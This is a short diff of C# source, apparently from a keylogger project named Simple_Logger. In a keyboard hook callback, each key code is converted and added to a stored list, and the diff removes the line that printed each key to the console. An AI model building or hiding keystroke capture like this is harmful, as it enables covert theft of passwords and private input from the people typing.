@@ -58,7 +58,6 @@ namespace Simple_Logger
             {
                 var vkCode = Marshal.ReadInt32(lParam);
                 Logger.Keys.Add(Converter.ConvertToString(vkCode)?.ToLower());
-                Console.WriteLine(Converter.ConvertToString(vkCode)?.ToLower());
             }
 
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
